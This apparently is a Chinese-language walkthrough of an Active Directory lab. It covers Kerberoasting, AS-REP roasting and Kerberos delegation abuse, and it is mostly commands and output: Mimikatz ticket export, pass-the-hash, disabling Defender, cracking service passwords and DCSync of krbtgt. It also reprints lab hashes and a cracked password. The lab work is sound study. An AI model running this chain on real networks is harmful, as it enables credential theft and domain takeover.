# Kerberoasting
# SPN

什么是SPN？
> SPN(Service Principal name)服务器主体名称。
> 在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。

查找所有SPN，会有很多返回，但主要查看域管理员开启的服务
```
PS C:\ad> Get-NetUser -spn |select userprincipalname,serviceprincipalname

userprincipalname serviceprincipalname
----------------- --------------------
                  kadmin/changepw
websvc            {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
svcadmin          {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```

尤其留意域管理员的信息，这里svcadmin开启了SQL server服务。

因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet


下面两条命令在学生shell下执行，如果报错了，可能是student VM的网络问题，重启一下
```
PS C:\ad> Add-Type -AssemblyName System.IdentityModel
PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"


Id                   : uuid-396ea046-4707-42b5-aeca-14c64449d666-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/21/2022 7:06:53 AM
ValidTo              : 2/21/2022 5:03:41 PM
ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

```

用klist命令

```
PS C:\ad> klist

Current LogonId is 0:0x3114e90c

Cached Tickets: (11)

<略>
#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/20/2022 23:06:53 (local)
        End Time:   2/21/2022 9:03:41 (local)
        Renew Time: 2/27/2022 23:03:41 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
<略>
```

有MSSQLSvc的TGS。client就是学生账号student366

用Mimikatz dump出tikets

```
 Invoke-Mimikatz -Command '"kerberos::list /export"'

 <略>
[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/20/2022 11:06:53 PM ; 2/21/2022 9:03:41 AM ; 2/27/2022 11:03:41 PM
   Server Name       : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
<略>
```

在当前目录生成了一个TGS文件```1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```

拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码
执行命令：
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

爆破结果
```
PS C:\ad\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarco
rp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp
.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
All tickets cracked!
```

得到了svcadmin的明文密码
```
*ThisisBlasphemyThisisMadness!!
```

用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录
```
PS C:\ad> Enter-PSSession –Computername dcorp-dc –credential dcorp\svcadmin
[dcorp-dc]: PS C:\Users\svcadmin\Documents> whoami
dcorp\svcadmin
[dcorp-dc]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
[dcorp-dc]: PS C:\Users\svcadmin\Documents>
```

# Targeted Kerberoasting - AS-REPs（Kerberos 预身份验证）

注意这里用的是dev版本的PowerView

枚举禁用了Kerberos预认证的用户
```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser -PreauthNotRequired -Verbose
```

枚举到一个VPN359user用户禁用了Kerberos预认证
使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解

```
PS C:\ad> cd .\ASREPRoast-master\
PS C:\ad\ASREPRoast-master> . .\ASREPRoast.ps1
PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName VPN359user -Verbose
```

tool里面没有JTR，去到kali破解这个哈希

## 枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户

```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

ObjectDN                : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
IdentityReferenceName   : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : group
```

因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限，所以可以强制关闭这些用户的预认证
```
 Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
```

关闭以后获取这个用户的krb5哈希

```
Get-ASREPHash -UserName Control359User -Verbose
```

# Targeted Kerberoasting - Set SPN

从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights

bjectDN                                                       ActiveDirectoryRights
--------                                                       ---------------------
CN=Control370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
```

选择Support370User用户，查询这个账号是否有SPN

```
PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname


serviceprincipalname
--------------------
```

没有。

因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN
```
Set-DomainObject -Identity Support370User -Set @{serviceprincipalname='dcorp/whateverX'} -Verbos
```

再次获取这个账号的SPN
```
PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname
serviceprincipalname
--------------------
dcorp/whateverX
```

根据这个SPN，我们可以请求一个可以被破解的ticket
```
Add-Type -AssemblyNAme System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"
```

使用klist命令列出SPN
```
PS C:\ad> klist

Current LogonId is 0:0x2a582
#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/15/2022 2:36:31 (local)
        End Time:   2/15/2022 12:36:31 (local)
        Renew Time: 2/22/2022 2:36:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
```

看到已经有dcorp/whateverX的SPN

用mimikatz导出

```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'
[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
   Server Name       : dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

导出来的tiket可以用tgsrepcrack.py破解

也可以用powerview导出krb5哈希，然后再用john破解
```
Get-DomainUser -Identity Support370User | Get-DomainSPNTicket | select -ExpandProperty Hash
```


# Kerberos Delegation

## 非约束委派

枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本
```
PS C:\ad> Get-NetComputer -UnConstrained |select cn
cn
--
DCORP-DC
DCORP-APPSRV
```

枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv

什么是无约束委派？

> 用户 A 去访问服务 B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问到的任意服务。

在下面这个例子里用户 A是DA管理员Administrator，服务 B是机器dcorp-appsrv。由于Administrator访问过dcorp-appsrv，所以把自己的TGT发送给了dcorp-appsrv，那么dcorp-appsrv就能够利用DA管理员的身份去访问域内的任何服务。

由于使用无约束委派的先决条件是有一个有本地管理权限的用户，
我们需要攻陷DCORP-APPSRV这台机器上一个有本地管理员权限的用户
之前我们分别收集了appadmin, srvadmin 和 websvc的用户名机器NTML
现在分别用这三个账号测试，是否在dcorp-appsrv这台机器上有本地管理员权限
```
appadmin:d549831a955fee51a43c83efb3928fa7
srvadmin:a98e18228819e8eec3dfa33cb68b0728
websvc：cc098f204c5887eaa8253e7c2749156f
```

分别对三个用户执行下面权限，得到一个该用户的新shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

appadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
```

websvc拥有local admin权限的机器有
```
 PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-std366.dollarcorp.moneycorp.local
```

srvadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
```

由枚举结果可知，符合条件的只有appadmin

### 方法一（DA令牌复用）

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz（这里如果不能载入，可以多试几次直接```Enter-PSSession $sess```,进去以后直接bypass掉AMSI）
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

横向到dcorp-appsrv，创建一个文件夹
```
PS C:\ad> Enter-PSSession $sess
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> mkdir user366
```

用Mimikatz导出所有令牌，看看是否有Administrator的令牌
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::tickets /export

<略>

Authentication Id : 0 ; 3929288 (00000000:003bf4c8)
Session           : Network from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 2/15/2022 6:02:00 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 2/15/2022 6:02:00 AM ; 2/15/2022 4:02:00 PM ; 2/22/2022 6:02:00 AM
           Service Name (02) : krbtgt ; DOLLARCORP.MONEYCORP.LOCAL ; @ DOLLARCORP.MONEYCORP.LOCAL
           Target Name  (--) : @ DOLLARCORP.MONEYCORP.LOCAL
           Client Name  (01) : Administrator ; @ DOLLARCORP.MONEYCORP.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             2d67ea81d9628838bac1d03a94ecaa0ac1002bff18529deb112cf2238b7a6270
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi !
<略>
```

如果上面不能取得Administrator的令牌，在学生机器执行下面这条触发，然后再用mimikatz导一次
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

如果已经可以查看到Administrator令牌，复用Administrator令牌，取得DA权限
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
```
执行成功！

测试我们现在是否有administrator权限，指定DC服务器执行whoami和hostname命令
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
dcorp\administrator
dcorp-dc
```

证明我们已经取得了DA权限


### 方法二（Printer Bug）

原理：MS-RPRN 有一项功能，允许任何域用户(已验证的用户)强制任何机器(后台运行了打印程序服务)连接到域用户选择的第二台机器，我们可以通过滥用Printer Bug错误来强制dcorp-dc连接到 dcorp-appsrv。

重新起一个appadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

把Rubeus.exe拷贝到dcorp-appsrv
```
Copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
```

进到dcorp-appsrv，运行Rubeus.exe，这个shell不要关闭
```
PS C:\ad> copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
PS C:\ad> Enter-PSSession $sess
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> cd ..\Downloads\
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Downloads> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


```



回到学生机，执行下面命令

```
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```


然后在dcorp-appsrv的Rubeus.exe里，就看到了DCORP-DC的TGT
```
[*] 2/15/2022 2:50:23 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  2/14/2022 10:34:09 PM
  EndTime               :  2/15/2022 8:34:09 AM
  RenewTill             :  2/21/2022 1:00:49 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgAofkSfMEPDetluumsJMry8ARJfAlyE8EKnm7Qg91biW0Flc8LqiyPfntatLcWNEnFWZqoVKMfjWRBCpRd7Bye2qIe9B4QtnDstjJGWuUeJ/thMsxMxKMp00GGASK4iv2aEGK+ZUz5ElsiJr4MYenJUR3FMDZ8uHoHoFyT2O9OMYA02K2F4EJY1cV0kwl4y/vEsFFcQcp62f0sATOLB/Fuz0qT+ATCMzUBOHDB9/i2uvrp96dTEEU1VdC6cihYRXxsfNAala7lP+bkp3K2dkxH/Rf8z/vocdlY0c/lo01ZhBatGm0aOJTlFNLsv/7wLxDx/WS51iAx2Vd6ionLuwSwBI8CyaXn7U/72Lzj2I9TJs9p1eoN9UMvmAQga2Qtt1aVGGedmOZZcFVsvAwuLUaatPCS1UlwljMikVkCp150zJY2ECZXmlHWcpmIU5QaoWN3RGFqzvp/Ruavh2rEAkv5/NHL8p2uPJp3VcEy4kgaF3mVvFX4GxnAl/okWXyhwQJX4BZ3Tf6922qcpSGxGMsD9Y+t0JDE9JrVdO4sgVFZn/tEJ7rAR/81p4w6QgLX8yxW5tsJDm9uEyfsu2w67K3tWcew6pKNNJLqN4ZQO8NK6jmieOq5vxV6IL5mn/LAS6RVQf43FY7Oan0dPlnJoFaIDpJKVO49H1TsWkGJBt15oCN1u8Arq6wE8JIBEU+LAw/jV9dSSIRyE+oJ1juHr1+47nDOBijoOS+qbq7clKPHZl0RdVDD0H847xAvWznAQpNsZlSui1/I1zYRq2uOvKdHiOOoJQi+cUwD01yqGKqWdhjknY/dL4JYWr7n+tYBwh+5fxL2/85H8xnR2TDr1tB/v4G07WQzip/zUT8P0uChgRYk7A2ATRTUYrmKZ1bPLbmd45f8477n0EQvhfKpkEyP9Qos3SI6fNtJRHPaO0B+biOaZLcoIfdWIPLNzVGVnGXjHbq+1hp6Q4OI7gYeXsqEYBZpspSMbId2VimqG4Bh8XAtPthpOw0YzrGA+6ZOtjHQmdzcKJyl3Py7wBXjqzwOj0I4Dp8EXzgVTitx7gSlJRumfGxt4OBrnLyDcE6iG1KmAuEaStZEtavskUJVhG4qfwKMbyGC1eagfdGYyPyOryW4tF+tVajxZY6UFyjNWNKjQXYM/JFDTEtBrltCn8o8amN/MYxo2H1SWM9XdEt6REJ+dc65w/PErZYFQtjqiPf2jtHWUGfNoEOm/3FrwADCiadC3pVfeEM68wI/ur4lV8ykw8g8ptoK34hq82qjmzDSWyA36JaCVaeN9C7cDHSiGtJ8BcIu3vwOR1BBgwjGorxOLM4ZGKmkDgDzdVOrtjYcsN3fpU8Osnoer+tIwkN3JYWpKoDxHJtTxRd8nc3kcipN0EOW4g3KlOvMYBTbJBTo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB/aCB+jCB9zCB9KArMCmgAwIBEqEiBCAPS1nJ2B4uyJ290hWYJVnxp98hbHcAgvtupb4NlKIbuKEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQLURDJKMHAwUAYKEAAKURGA8yMDIyMDIxNTA2MzQwOVqmERgPMjAyMjAyMTUxNjM0MDlapxEYDzIwMjIwMjIxMjEwMDQ5WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=
```

怎么利用TGT？

利用命令：```.\Rubeus.exe ptt /ticket:<TGTofDCORP-DC$>```


导入成功

用klist命令查看ticket
```
[+] Ticket successfully imported!
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (1)

#0>     Client: DCORP-DC$ @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/14/2022 22:34:09 (local)
        End Time:   2/15/2022 8:34:09 (local)
        Renew Time: 2/21/2022 13:00:49 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

因为现在我们已经有了DA权限，可以使用dcsync导出dcorp\krbtgt的NTML哈希
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## 枚举约束委派的用户，需要用dev版本Powerview
```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser –TrustedToAuth
logoncount               : 27
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 2/15/2022 5:33:56 AM
userprincipalname        : websvc
name                     : web svc
objectsid                : S-1-5-21-1874506631-3219952063-538504511-1113
samaccountname           : websvc
codepage                 : 0
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 2/15/2022 1:33:56 PM
instancetype             : 4
usncreated               : 14488
objectguid               : 8862b451-0bc9-4b26-8ffb-65c803cc74e7
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
lastlogon                : 2/15/2022 6:17:36 AM
badpwdcount              : 0
cn                       : web svc
whencreated              : 2/17/2019 1:01:06 PM
primarygroupid           : 513
pwdlastset               : 2/17/2019 5:01:06 AM
```

留意：```msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}```,这里表示websvc可以被利用进入dcorp-mssql的文件系统

由于我们之前已经枚举到了websvc的ntml哈希,这里直接利用

```
websvc：cc098f204c5887eaa8253e7c2749156f
```

### 方法一：kekeo.exe
使用kekeo的 tgt::ask模块，向websvc请求一个TGT
```
PS C:\ad> .\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with  9 modules * * */

kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
Realm        : dollarcorp.moneycorp.local (dollarcorp)
User         : websvc (websvc)
CName        : websvc   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): cc098f204c5887eaa8253e7c2749156f
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

现在我们有了TGT，向dcorp-mssql请求一个TGS。需要注意，这个TGS只有进入系统的权限，不能执行系统命令

```
kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
Ticket  : TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: websvc @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] T: [2/15/2022 7:20:11 AM ; 2/15/2022 5:20:11 PM] {R:2/22/2022 7:20:11 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 996b1f2a3973f2cad8d252b6ad5c47b2d2ee2a0de2dbb2f4eb37128d22011c20
  [s4u2self]  Administrator@dollarcorp.moneycorp.local
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_websvc@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
Service(s):
  [s4u2proxy] cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

生成了一个TGS，使用Invoke-Mimikatz注入到内存当中
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
```

查看dcorp-mssql，看是否能列出文件列表（因为我们只有查看文件的权限）
```
PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                PerfLogs
d-r---        2/17/2019   5:19 AM                Program Files
d-----        2/17/2019   5:17 AM                Program Files (x86)
